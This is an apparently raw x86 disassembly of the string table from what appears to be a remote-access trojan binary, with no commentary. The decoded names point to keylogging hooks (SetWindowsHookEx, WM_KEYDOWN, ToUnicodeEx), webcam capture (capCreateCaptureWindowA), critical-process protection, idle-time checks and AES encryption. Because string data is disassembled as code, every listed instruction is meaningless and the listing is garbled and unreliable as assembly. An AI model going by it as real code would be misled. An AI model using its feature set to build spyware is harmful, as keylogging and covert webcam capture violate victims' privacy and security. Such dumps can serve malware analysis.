  4080d7:	61                   	popa
  4080d8:	74 61                	je     0x40813b
  4080da:	00 4f 70             	add    %cl,0x70(%edi)
  4080dd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4080df:	55                   	push   %ebp
  4080e0:	72 6c                	jb     0x40814e
  4080e2:	00 55 72             	add    %dl,0x72(%ebp)
  4080e5:	6c                   	insb   (%dx),%es:(%edi)
  4080e6:	00 48 69             	add    %cl,0x69(%eax)
  4080e9:	64 64 65 6e          	fs fs outsb %gs:(%esi),(%dx)
  4080ed:	00 63 61             	add    %ah,0x61(%ebx)
  4080f0:	70 43                	jo     0x408135
  4080f2:	72 65                	jb     0x408159
  4080f4:	61                   	popa
  4080f5:	74 65                	je     0x40815c
  4080f7:	43                   	inc    %ebx
  4080f8:	61                   	popa
  4080f9:	70 74                	jo     0x40816f
  4080fb:	75 72                	jne    0x40816f
  4080fd:	65 57                	gs push %edi
  4080ff:	69 6e 64 6f 77 41 00 	imul   $0x41776f,0x64(%esi),%ebp
  408106:	6c                   	insb   (%dx),%es:(%edi)
  408107:	70 73                	jo     0x40817c
  408109:	7a 57                	jp     0x408162
  40810b:	69 6e 64 6f 77 4e 61 	imul   $0x614e776f,0x64(%esi),%ebp
  408112:	6d                   	insl   (%dx),%es:(%edi)
  408113:	65 00 64 77 53       	add    %ah,%gs:0x53(%edi,%esi,2)
  408118:	74 79                	je     0x408193
  40811a:	6c                   	insb   (%dx),%es:(%edi)
  40811b:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40811f:	59                   	pop    %ecx
  408120:	00 6e 57             	add    %ch,0x57(%esi)
  408123:	69 64 74 68 00 6e 48 	imul   $0x65486e00,0x68(%esp,%esi,2),%esp
  40812a:	65 
  40812b:	69 67 68 74 00 68 77 	imul   $0x77680074,0x68(%edi),%esp
  408132:	6e                   	outsb  %ds:(%esi),(%dx)
  408133:	64 50                	fs push %eax
  408135:	61                   	popa
  408136:	72 65                	jb     0x40819d
  408138:	6e                   	outsb  %ds:(%esi),(%dx)
  408139:	74 00                	je     0x40813b
  40813b:	6e                   	outsb  %ds:(%esi),(%dx)
  40813c:	49                   	dec    %ecx
  40813d:	44                   	inc    %esp
  40813e:	00 48 61             	add    %cl,0x61(%eax)
  408141:	6e                   	outsb  %ds:(%esi),(%dx)
  408142:	64 6c                	fs insb (%dx),%es:(%edi)
  408144:	65 00 63 61          	add    %ah,%gs:0x61(%ebx)
  408148:	70 47                	jo     0x408191
  40814a:	65 74 44             	gs je  0x408191
  40814d:	72 69                	jb     0x4081b8
  40814f:	76 65                	jbe    0x4081b6
  408151:	72 44                	jb     0x408197
  408153:	65 73 63             	gs jae 0x4081b9
  408156:	72 69                	jb     0x4081c1
  408158:	70 74                	jo     0x4081ce
  40815a:	69 6f 6e 41 00 77 44 	imul   $0x44770041,0x6e(%edi),%ebp
  408161:	72 69                	jb     0x4081cc
  408163:	76 65                	jbe    0x4081ca
  408165:	72 00                	jb     0x408167
  408167:	6c                   	insb   (%dx),%es:(%edi)
  408168:	70 73                	jo     0x4081dd
  40816a:	7a 4e                	jp     0x4081ba
  40816c:	61                   	popa
  40816d:	6d                   	insl   (%dx),%es:(%edi)
  40816e:	65 00 63 62          	add    %ah,%gs:0x62(%ebx)
  408172:	4e                   	dec    %esi
  408173:	61                   	popa
  408174:	6d                   	insl   (%dx),%es:(%edi)
  408175:	65 00 6c 70 73       	add    %ch,%gs:0x73(%eax,%esi,2)
  40817a:	7a 56                	jp     0x4081d2
  40817c:	65 72 00             	gs jb  0x40817f
  40817f:	63 62 56             	arpl   %esp,0x56(%edx)
  408182:	65 72 00             	gs jb  0x408185
  408185:	43                   	inc    %ebx
  408186:	61                   	popa
  408187:	6d                   	insl   (%dx),%es:(%edi)
  408188:	00 52 75             	add    %dl,0x75(%edx)
  40818b:	6e                   	outsb  %ds:(%esi),(%dx)
  40818c:	44                   	inc    %esp
  40818d:	69 73 6b 00 45 78 74 	imul   $0x74784500,0x6b(%ebx),%esi
  408194:	65 6e                	outsb  %gs:(%esi),(%dx)
  408196:	73 69                	jae    0x408201
  408198:	6f                   	outsl  %ds:(%esi),(%dx)
  408199:	6e                   	outsb  %ds:(%esi),(%dx)
  40819a:	00 4d 65             	add    %cl,0x65(%ebp)
  40819d:	6d                   	insl   (%dx),%es:(%edi)
  40819e:	6f                   	outsl  %ds:(%esi),(%dx)
  40819f:	72 79                	jb     0x40821a
  4081a1:	00 62 75             	add    %ah,0x75(%edx)
  4081a4:	66 66 65 72 00       	data16 data16 gs jb 0x4081a9
  4081a9:	55                   	push   %ebp
  4081aa:	4e                   	dec    %esi
  4081ab:	53                   	push   %ebx
  4081ac:	00 49 73             	add    %cl,0x73(%ecx)
  4081af:	55                   	push   %ebp
  4081b0:	70 64                	jo     0x408216
  4081b2:	61                   	popa
  4081b3:	74 65                	je     0x40821a
  4081b5:	00 53 74             	add    %dl,0x74(%ebx)
  4081b8:	72 00                	jb     0x4081ba
  4081ba:	43                   	inc    %ebx
  4081bb:	75 72                	jne    0x40822f
  4081bd:	72 65                	jb     0x408224
  4081bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c0:	74 41                	je     0x408203
  4081c2:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4081c6:	65 57                	gs push %edi
  4081c8:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  4081cf:	74 6c                	je     0x40823d
  4081d1:	65 00 63 61          	add    %ah,%gs:0x61(%ebx)
  4081d5:	6c                   	insb   (%dx),%es:(%edi)
  4081d6:	6c                   	insb   (%dx),%es:(%edi)
  4081d7:	6b 00 53             	imul   $0x53,(%eax),%eax
  4081da:	65 74 48             	gs je  0x408225
  4081dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4081de:	6f                   	outsl  %ds:(%esi),(%dx)
  4081df:	6b 00 70             	imul   $0x70,(%eax),%eax
  4081e2:	72 6f                	jb     0x408253
  4081e4:	63 00                	arpl   %eax,(%eax)
  4081e6:	48                   	dec    %eax
  4081e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4081e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4081e9:	6b 43 61 6c          	imul   $0x6c,0x61(%ebx),%eax
  4081ed:	6c                   	insb   (%dx),%es:(%edi)
  4081ee:	62 61 63             	bound  %esp,0x63(%ecx)
  4081f1:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  4081f4:	43                   	inc    %ebx
  4081f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4081f6:	64 65 00 77 50       	fs add %dh,%gs:0x50(%edi)
  4081fb:	61                   	popa
  4081fc:	72 61                	jb     0x40825f
  4081fe:	6d                   	insl   (%dx),%es:(%edi)
  4081ff:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  408203:	72 61                	jb     0x408266
  408205:	6d                   	insl   (%dx),%es:(%edi)
  408206:	00 4b 65             	add    %cl,0x65(%ebx)
  408209:	79 62                	jns    0x40826d
  40820b:	6f                   	outsl  %ds:(%esi),(%dx)
  40820c:	61                   	popa
  40820d:	72 64                	jb     0x408273
  40820f:	4c                   	dec    %esp
  408210:	61                   	popa
  408211:	79 6f                	jns    0x408282
  408213:	75 74                	jne    0x408289
  408215:	00 76 6b             	add    %dh,0x6b(%esi)
  408218:	43                   	inc    %ebx
  408219:	6f                   	outsl  %ds:(%esi),(%dx)
  40821a:	64 65 00 47 65       	fs add %al,%gs:0x65(%edi)
  40821f:	74 41                	je     0x408262
  408221:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408225:	65 57                	gs push %edi
  408227:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  40822e:	74 6c                	je     0x40829c
  408230:	65 00 57 4d          	add    %dl,%gs:0x4d(%edi)
  408234:	5f                   	pop    %edi
  408235:	4b                   	dec    %ebx
  408236:	45                   	inc    %ebp
  408237:	59                   	pop    %ecx
  408238:	44                   	inc    %esp
  408239:	4f                   	dec    %edi
  40823a:	57                   	push   %edi
  40823b:	4e                   	dec    %esi
  40823c:	00 5f 70             	add    %bl,0x70(%edi)
  40823f:	72 6f                	jb     0x4082b0
  408241:	63 00                	arpl   %eax,(%eax)
  408243:	5f                   	pop    %edi
  408244:	68 6f 6f 6b 49       	push   $0x496b6f6f
  408249:	44                   	inc    %esp
  40824a:	00 53 65             	add    %dl,0x65(%ebx)
  40824d:	74 57                	je     0x4082a6
  40824f:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  408256:	6f                   	outsl  %ds:(%esi),(%dx)
  408257:	6f                   	outsl  %ds:(%esi),(%dx)
  408258:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  40825c:	69 64 48 6f 6f 6b 00 	imul   $0x6c006b6f,0x6f(%eax,%ecx,2),%esp
  408263:	6c 
  408264:	70 66                	jo     0x4082cc
  408266:	6e                   	outsb  %ds:(%esi),(%dx)
  408267:	00 68 4d             	add    %ch,0x4d(%eax)
  40826a:	6f                   	outsl  %ds:(%esi),(%dx)
  40826b:	64 00 64 77 54       	add    %ah,%fs:0x54(%edi,%esi,2)
  408270:	68 72 65 61 64       	push   $0x64616572
  408275:	49                   	dec    %ecx
  408276:	64 00 55 6e          	add    %dl,%fs:0x6e(%ebp)
  40827a:	68 6f 6f 6b 57       	push   $0x576b6f6f
  40827f:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  408286:	6f                   	outsl  %ds:(%esi),(%dx)
  408287:	6f                   	outsl  %ds:(%esi),(%dx)
  408288:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  40828c:	68 68 6b 00 43       	push   $0x43006b68
  408291:	61                   	popa
  408292:	6c                   	insb   (%dx),%es:(%edi)
  408293:	6c                   	insb   (%dx),%es:(%edi)
  408294:	4e                   	dec    %esi
  408295:	65 78 74             	gs js  0x40830c
  408298:	48                   	dec    %eax
  408299:	6f                   	outsl  %ds:(%esi),(%dx)
  40829a:	6f                   	outsl  %ds:(%esi),(%dx)
  40829b:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  40829f:	57                   	push   %edi
  4082a0:	48                   	dec    %eax
  4082a1:	4b                   	dec    %ebx
  4082a2:	45                   	inc    %ebp
  4082a3:	59                   	pop    %ecx
  4082a4:	42                   	inc    %edx
  4082a5:	4f                   	dec    %edi
  4082a6:	41                   	inc    %ecx
  4082a7:	52                   	push   %edx
  4082a8:	44                   	inc    %esp
  4082a9:	4c                   	dec    %esp
  4082aa:	4c                   	dec    %esp
  4082ab:	00 47 65             	add    %al,0x65(%edi)
  4082ae:	74 46                	je     0x4082f6
  4082b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4082b1:	72 65                	jb     0x408318
  4082b3:	67 72 6f             	addr16 jb 0x408325
  4082b6:	75 6e                	jne    0x408326
  4082b8:	64 57                	fs push %edi
  4082ba:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  4082c1:	65 74 57             	gs je  0x40831b
  4082c4:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  4082cb:	72 65                	jb     0x408332
  4082cd:	61                   	popa
  4082ce:	64 50                	fs push %eax
  4082d0:	72 6f                	jb     0x408341
  4082d2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4082d5:	73 49                	jae    0x408320
  4082d7:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  4082db:	6e                   	outsb  %ds:(%esi),(%dx)
  4082dc:	64 00 6c 70 64       	add    %ch,%fs:0x64(%eax,%esi,2)
  4082e1:	77 50                	ja     0x408333
  4082e3:	72 6f                	jb     0x408354
  4082e5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4082e8:	73 49                	jae    0x408333
  4082ea:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  4082ee:	74 4b                	je     0x40833b
  4082f0:	65 79 53             	gs jns 0x408346
  4082f3:	74 61                	je     0x408356
  4082f5:	74 65                	je     0x40835c
  4082f7:	00 6b 65             	add    %ch,0x65(%ebx)
  4082fa:	79 43                	jns    0x40833f
  4082fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4082fd:	64 65 00 47 65       	fs add %al,%gs:0x65(%edi)
  408302:	74 4b                	je     0x40834f
  408304:	65 79 62             	gs jns 0x408369
  408307:	6f                   	outsl  %ds:(%esi),(%dx)
  408308:	61                   	popa
  408309:	72 64                	jb     0x40836f
  40830b:	53                   	push   %ebx
  40830c:	74 61                	je     0x40836f
  40830e:	74 65                	je     0x408375
  408310:	00 6c 70 4b          	add    %ch,0x4b(%eax,%esi,2)
  408314:	65 79 53             	gs jns 0x40836a
  408317:	74 61                	je     0x40837a
  408319:	74 65                	je     0x408380
  40831b:	00 47 65             	add    %al,0x65(%edi)
  40831e:	74 4b                	je     0x40836b
  408320:	65 79 62             	gs jns 0x408385
  408323:	6f                   	outsl  %ds:(%esi),(%dx)
  408324:	61                   	popa
  408325:	72 64                	jb     0x40838b
  408327:	4c                   	dec    %esp
  408328:	61                   	popa
  408329:	79 6f                	jns    0x40839a
  40832b:	75 74                	jne    0x4083a1
  40832d:	00 69 64             	add    %ch,0x64(%ecx)
  408330:	54                   	push   %esp
  408331:	68 72 65 61 64       	push   $0x64616572
  408336:	00 53 79             	add    %dl,0x79(%ebx)
  408339:	73 74                	jae    0x4083af
  40833b:	65 6d                	gs insl (%dx),%es:(%edi)
  40833d:	2e 54                	cs push %esp
  40833f:	65 78 74             	gs js  0x4083b6
  408342:	00 53 74             	add    %dl,0x74(%ebx)
  408345:	72 69                	jb     0x4083b0
  408347:	6e                   	outsb  %ds:(%esi),(%dx)
  408348:	67 42                	addr16 inc %edx
  40834a:	75 69                	jne    0x4083b5
  40834c:	6c                   	insb   (%dx),%es:(%edi)
  40834d:	64 65 72 00          	fs gs jb 0x408351
  408351:	54                   	push   %esp
  408352:	6f                   	outsl  %ds:(%esi),(%dx)
  408353:	55                   	push   %ebp
  408354:	6e                   	outsb  %ds:(%esi),(%dx)
  408355:	69 63 6f 64 65 45 78 	imul   $0x78456564,0x6f(%ebx),%esp
  40835c:	00 77 56             	add    %dh,0x56(%edi)
  40835f:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  408366:	77 53                	ja     0x4083bb
  408368:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  40836b:	43                   	inc    %ebx
  40836c:	6f                   	outsl  %ds:(%esi),(%dx)
  40836d:	64 65 00 70 77       	fs add %dh,%gs:0x77(%eax)
  408372:	73 7a                	jae    0x4083ee
  408374:	42                   	inc    %edx
  408375:	75 66                	jne    0x4083dd
  408377:	66 00 63 63          	data16 add %ah,0x63(%ebx)
  40837b:	68 42 75 66 66       	push   $0x66667542
  408380:	00 77 46             	add    %dh,0x46(%edi)
  408383:	6c                   	insb   (%dx),%es:(%edi)
  408384:	61                   	popa
  408385:	67 73 00             	addr16 jae 0x408388
  408388:	64 77 68             	fs ja  0x4083f3
  40838b:	6b 6c 00 4d 61       	imul   $0x61,0x4d(%eax,%eax,1),%ebp
  408390:	70 56                	jo     0x4083e8
  408392:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  408399:	65 79 00             	gs jns 0x40839c
  40839c:	75 43                	jne    0x4083e1
  40839e:	6f                   	outsl  %ds:(%esi),(%dx)
  40839f:	64 65 00 75 4d       	fs add %dh,%gs:0x4d(%ebp)
  4083a4:	61                   	popa
  4083a5:	70 54                	jo     0x4083fb
  4083a7:	79 70                	jns    0x408419
  4083a9:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  4083ad:	74 43                	je     0x4083f2
  4083af:	75 72                	jne    0x408423
  4083b1:	72 65                	jb     0x408418
  4083b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4083b4:	74 50                	je     0x408406
  4083b6:	72 6f                	jb     0x408427
  4083b8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083bb:	73 49                	jae    0x408406
  4083bd:	73 43                	jae    0x408402
  4083bf:	72 69                	jb     0x40842a
  4083c1:	74 69                	je     0x40842c
  4083c3:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4083c6:	00 69 73             	add    %ch,0x73(%ecx)
  4083c9:	43                   	inc    %ebx
  4083ca:	72 69                	jb     0x408435
  4083cc:	74 69                	je     0x408437
  4083ce:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4083d1:	00 72 65             	add    %dh,0x65(%edx)
  4083d4:	66 57                	push   %di
  4083d6:	61                   	popa
  4083d7:	73 43                	jae    0x40841c
  4083d9:	72 69                	jb     0x408444
  4083db:	74 69                	je     0x408446
  4083dd:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4083e0:	00 6e 65             	add    %ch,0x65(%esi)
  4083e3:	65 64 53             	gs fs push %ebx
  4083e6:	79 73                	jns    0x40845b
  4083e8:	74 65                	je     0x40844f
  4083ea:	6d                   	insl   (%dx),%es:(%edi)
  4083eb:	43                   	inc    %ebx
  4083ec:	72 69                	jb     0x408457
  4083ee:	74 69                	je     0x408459
  4083f0:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4083f3:	42                   	inc    %edx
  4083f4:	72 65                	jb     0x40845b
  4083f6:	61                   	popa
  4083f7:	6b 73 00 4d          	imul   $0x4d,0x0(%ebx),%esi
  4083fb:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408402:	74 2e                	je     0x408432
  408404:	57                   	push   %edi
  408405:	69 6e 33 32 00 53 65 	imul   $0x65530032,0x33(%esi),%ebp
  40840c:	73 73                	jae    0x408481
  40840e:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408415:	6e                   	outsb  %ds:(%esi),(%dx)
  408416:	67 45                	addr16 inc %ebp
  408418:	76 65                	jbe    0x40847f
  40841a:	6e                   	outsb  %ds:(%esi),(%dx)
  40841b:	74 41                	je     0x40845e
  40841d:	72 67                	jb     0x408486
  40841f:	73 00                	jae    0x408421
  408421:	53                   	push   %ebx
  408422:	79 73                	jns    0x408497
  408424:	74 65                	je     0x40848b
  408426:	6d                   	insl   (%dx),%es:(%edi)
  408427:	45                   	inc    %ebp
  408428:	76 65                	jbe    0x40848f
  40842a:	6e                   	outsb  %ds:(%esi),(%dx)
  40842b:	74 73                	je     0x4084a0
  40842d:	5f                   	pop    %edi
  40842e:	53                   	push   %ebx
  40842f:	65 73 73             	gs jae 0x4084a5
  408432:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408439:	6e                   	outsb  %ds:(%esi),(%dx)
  40843a:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40843e:	6e                   	outsb  %ds:(%esi),(%dx)
  40843f:	64 65 72 00          	fs gs jb 0x408443
  408443:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  408447:	69 74 69 63 61 6c 50 	imul   $0x72506c61,0x63(%ecx,%ebp,2),%esi
  40844e:	72 
  40844f:	6f                   	outsl  %ds:(%esi),(%dx)
  408450:	63 65 73             	arpl   %esp,0x73(%ebp)
  408453:	73 5f                	jae    0x4084b4
  408455:	45                   	inc    %ebp
  408456:	6e                   	outsb  %ds:(%esi),(%dx)
  408457:	61                   	popa
  408458:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40845c:	43                   	inc    %ebx
  40845d:	72 69                	jb     0x4084c8
  40845f:	74 69                	je     0x4084ca
  408461:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408464:	50                   	push   %eax
  408465:	72 6f                	jb     0x4084d6
  408467:	63 65 73             	arpl   %esp,0x73(%ebp)
  40846a:	73 65                	jae    0x4084d1
  40846c:	73 5f                	jae    0x4084cd
  40846e:	44                   	inc    %esp
  40846f:	69 73 61 62 6c 65 00 	imul   $0x656c62,0x61(%ebx),%esi
  408476:	44                   	inc    %esp
  408477:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40847b:	70 74                	jo     0x4084f1
  40847d:	00 69 6e             	add    %ch,0x6e(%ecx)
  408480:	70 75                	jo     0x4084f7
  408482:	74 00                	je     0x408484
  408484:	50                   	push   %eax
  408485:	72 6f                	jb     0x4084f6
  408487:	63 65 73             	arpl   %esp,0x73(%ebp)
  40848a:	73 44                	jae    0x4084d0
  40848c:	70 69                	jo     0x4084f7
  40848e:	00 53 65             	add    %dl,0x65(%ebx)
  408491:	74 50                	je     0x4084e3
  408493:	72 6f                	jb     0x408504
  408495:	63 65 73             	arpl   %esp,0x73(%ebp)
  408498:	73 44                	jae    0x4084de
  40849a:	70 69                	jo     0x408505
  40849c:	41                   	inc    %ecx
  40849d:	77 61                	ja     0x408500
  40849f:	72 65                	jb     0x408506
  4084a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4084a2:	65 73 73             	gs jae 0x408518
  4084a5:	00 61 77             	add    %ah,0x77(%ecx)
  4084a8:	61                   	popa
  4084a9:	72 65                	jb     0x408510
  4084ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ac:	65 73 73             	gs jae 0x408522
  4084af:	00 49 73             	add    %cl,0x73(%ecx)
  4084b2:	56                   	push   %esi
  4084b3:	61                   	popa
  4084b4:	6c                   	insb   (%dx),%es:(%edi)
  4084b5:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  4084bc:	6e 
  4084bd:	4e                   	dec    %esi
  4084be:	61                   	popa
  4084bf:	6d                   	insl   (%dx),%es:(%edi)
  4084c0:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  4084c4:	6d                   	insl   (%dx),%es:(%edi)
  4084c5:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4084c9:	6c                   	insb   (%dx),%es:(%edi)
  4084ca:	65 53                	gs push %ebx
  4084cc:	74 72                	je     0x408540
  4084ce:	65 61                	gs popa
  4084d0:	6d                   	insl   (%dx),%es:(%edi)
  4084d1:	00 66 69             	add    %ah,0x69(%esi)
  4084d4:	6c                   	insb   (%dx),%es:(%edi)
  4084d5:	65 53                	gs push %ebx
  4084d7:	74 72                	je     0x40854b
  4084d9:	65 61                	gs popa
  4084db:	6d                   	insl   (%dx),%es:(%edi)
  4084dc:	00 41 6c             	add    %al,0x6c(%ecx)
  4084df:	70 68                	jo     0x408549
  4084e1:	61                   	popa
  4084e2:	62 65 74             	bound  %esp,0x74(%ebp)
  4084e5:	00 52 61             	add    %dl,0x61(%edx)
  4084e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e9:	64 6f                	outsl  %fs:(%esi),(%dx)
  4084eb:	6d                   	insl   (%dx),%es:(%edi)
  4084ec:	00 50 4c             	add    %dl,0x4c(%eax)
  4084ef:	00 63 75             	add    %ah,0x75(%ebx)
  4084f2:	72 72                	jb     0x408566
  4084f4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4084f6:	74 00                	je     0x4084f8
  4084f8:	47                   	inc    %edi
  4084f9:	65 74 52             	gs je  0x40854e
  4084fc:	61                   	popa
  4084fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fe:	64 6f                	outsl  %fs:(%esi),(%dx)
  408500:	6d                   	insl   (%dx),%es:(%edi)
  408501:	53                   	push   %ebx
  408502:	74 72                	je     0x408576
  408504:	69 6e 67 00 6c 65 6e 	imul   $0x6e656c00,0x67(%esi),%ebp
  40850b:	67 74 68             	addr16 je 0x408576
  40850e:	00 47 65             	add    %al,0x65(%edi)
  408511:	74 4c                	je     0x40855f
  408513:	61                   	popa
  408514:	73 74                	jae    0x40858a
  408516:	49                   	dec    %ecx
  408517:	6e                   	outsb  %ds:(%esi),(%dx)
  408518:	70 75                	jo     0x40858f
  40851a:	74 49                	je     0x408565
  40851c:	6e                   	outsb  %ds:(%esi),(%dx)
  40851d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40851f:	00 70 6c             	add    %dh,0x6c(%eax)
  408522:	69 69 00 69 64 6c 65 	imul   $0x656c6469,0x0(%ecx),%ebp
  408529:	74 69                	je     0x408594
  40852b:	6d                   	insl   (%dx),%es:(%edi)
  40852c:	65 00 6c 61 73       	add    %ch,%gs:0x73(%ecx,%eiz,2)
  408531:	74 49                	je     0x40857c
  408533:	6e                   	outsb  %ds:(%esi),(%dx)
  408534:	70 75                	jo     0x4085ab
  408536:	74 49                	je     0x408581
  408538:	6e                   	outsb  %ds:(%esi),(%dx)
  408539:	66 00 47 65          	data16 add %al,0x65(%edi)
  40853d:	74 4c                	je     0x40858b
  40853f:	61                   	popa
  408540:	73 74                	jae    0x4085b6
  408542:	49                   	dec    %ecx
  408543:	6e                   	outsb  %ds:(%esi),(%dx)
  408544:	70 75                	jo     0x4085bb
  408546:	74 54                	je     0x40859c
  408548:	69 6d 65 00 54 69 6d 	imul   $0x6d695400,0x65(%ebp),%ebp
  40854f:	65 53                	gs push %ebx
  408551:	70 61                	jo     0x4085b4
  408553:	6e                   	outsb  %ds:(%esi),(%dx)
  408554:	00 73 75             	add    %dh,0x75(%ebx)
  408557:	6d                   	insl   (%dx),%es:(%edi)
  408558:	6f                   	outsl  %ds:(%esi),(%dx)
  408559:	66 69 64 6c 65 74 69 	imul   $0x6974,0x65(%esp,%ebp,2),%sp
  408560:	6d                   	insl   (%dx),%es:(%edi)
  408561:	65 00 4c 61 73       	add    %cl,%gs:0x73(%ecx,%eiz,2)
  408566:	74 4c                	je     0x4085b4
  408568:	61                   	popa
  408569:	73 74                	jae    0x4085df
  40856b:	49                   	dec    %ecx
  40856c:	64 6c                	fs insb (%dx),%es:(%edi)
  40856e:	65 74 69             	gs je  0x4085da
  408571:	6d                   	insl   (%dx),%es:(%edi)
  408572:	65 00 54 69 6d       	add    %dl,%gs:0x6d(%ecx,%ebp,2)
  408577:	65 00 4c 61 73       	add    %cl,%gs:0x73(%ecx,%eiz,2)
  40857c:	74 41                	je     0x4085bf
  40857e:	63 74 00 75          	arpl   %esi,0x75(%eax,%eax,1)
  408582:	73 65                	jae    0x4085e9
  408584:	72 41                	jb     0x4085c7
  408586:	67 65 6e             	outsb  %gs:(%si),(%dx)
  408589:	74 73                	je     0x4085fe
  40858b:	00 47 65             	add    %al,0x65(%edi)
  40858e:	74 57                	je     0x4085e7
  408590:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  408597:	78 74                	js     0x40860d
  408599:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40859d:	74 00                	je     0x40859f
  40859f:	63 6f 75             	arpl   %ebp,0x75(%edi)
  4085a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4085a3:	74 00                	je     0x4085a5
  4085a5:	53                   	push   %ebx
  4085a6:	65 74 54             	gs je  0x4085fd
  4085a9:	68 72 65 61 64       	push   $0x64616572
  4085ae:	45                   	inc    %ebp
  4085af:	78 65                	js     0x408616
  4085b1:	63 75 74             	arpl   %esi,0x74(%ebp)
  4085b4:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4085bb:	65 00 65 73          	add    %ah,%gs:0x73(%ebp)
  4085bf:	46                   	inc    %esi
  4085c0:	6c                   	insb   (%dx),%es:(%edi)
  4085c1:	61                   	popa
  4085c2:	67 73 00             	addr16 jae 0x4085c5
  4085c5:	50                   	push   %eax
  4085c6:	72 65                	jb     0x40862d
  4085c8:	76 65                	jbe    0x40862f
  4085ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4085cb:	74 53                	je     0x408620
  4085cd:	6c                   	insb   (%dx),%es:(%edi)
  4085ce:	65 65 70 00          	gs gs jo 0x4085d2
  4085d2:	53                   	push   %ebx
  4085d3:	42                   	inc    %edx
  4085d4:	00 73 00             	add    %dh,0x0(%ebx)
  4085d7:	42                   	inc    %edx
  4085d8:	53                   	push   %ebx
  4085d9:	00 49 44             	add    %cl,0x44(%ecx)
  4085dc:	00 47 65             	add    %al,0x65(%edi)
  4085df:	74 48                	je     0x408629
  4085e1:	61                   	popa
  4085e2:	73 68                	jae    0x40864c
  4085e4:	54                   	push   %esp
  4085e5:	00 73 74             	add    %dh,0x74(%ebx)
  4085e8:	72 54                	jb     0x40863e
  4085ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4085eb:	48                   	dec    %eax
  4085ec:	61                   	popa
  4085ed:	73 68                	jae    0x408657
  4085ef:	00 53 65             	add    %dl,0x65(%ebx)
  4085f2:	74 56                	je     0x40864a
  4085f4:	61                   	popa
  4085f5:	6c                   	insb   (%dx),%es:(%edi)
  4085f6:	75 65                	jne    0x40865d
  4085f8:	00 76 61             	add    %dh,0x61(%esi)
  4085fb:	6c                   	insb   (%dx),%es:(%edi)
  4085fc:	75 65                	jne    0x408663
  4085fe:	00 47 65             	add    %al,0x65(%edi)
  408601:	74 56                	je     0x408659
  408603:	61                   	popa
  408604:	6c                   	insb   (%dx),%es:(%edi)
  408605:	75 65                	jne    0x40866c
  408607:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40860b:	6f                   	outsl  %ds:(%esi),(%dx)
  40860c:	6d                   	insl   (%dx),%es:(%edi)
  40860d:	70 72                	jo     0x408681
  40860f:	65 73 73             	gs jae 0x408685
  408612:	00 43 6f             	add    %al,0x6f(%ebx)
  408615:	6d                   	insl   (%dx),%es:(%edi)
  408616:	70 72                	jo     0x40868a
  408618:	65 73 73             	gs jae 0x40868e
  40861b:	00 41 45             	add    %al,0x45(%ecx)
  40861e:	53                   	push   %ebx
  40861f:	5f                   	pop    %edi
  408620:	45                   	inc    %ebp
  408621:	6e                   	outsb  %ds:(%esi),(%dx)
  408622:	63 72 79             	arpl   %esi,0x79(%edx)
  408625:	70 74                	jo     0x40869b
